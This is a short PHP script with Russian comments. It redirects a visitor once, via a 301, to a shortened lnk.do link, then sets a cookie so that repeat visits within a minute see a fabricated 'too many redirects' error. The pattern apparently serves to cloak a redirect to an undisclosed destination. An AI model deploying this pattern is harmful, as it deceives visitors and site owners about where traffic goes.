<?php
// Имя куки для отслеживания перенаправления
$cookie_name = 'redirected';

// Проверяем, установлен ли куки
if (!isset($_COOKIE[$cookie_name])) {
    // Устанавливаем куки с истечением через 60 секунд
    setcookie($cookie_name, '1', time() + 60, '/');

    // Выполняем перенаправление
    header('HTTP/1.1 301 Moved Permanently');
    header('Location: https://lnk.do/a4GVnvtZ');
    exit();
} else {
    // Куки уже установлен, показываем сообщение об ошибке
    header("Content-Type: text/html; charset=UTF-8");
    echo "<h1>Ошибка перенаправления</h1>";
    echo "<p>Произошло слишком много перенаправлений. Пожалуйста, попробуйте позже.</p>";
    exit();
}
?>
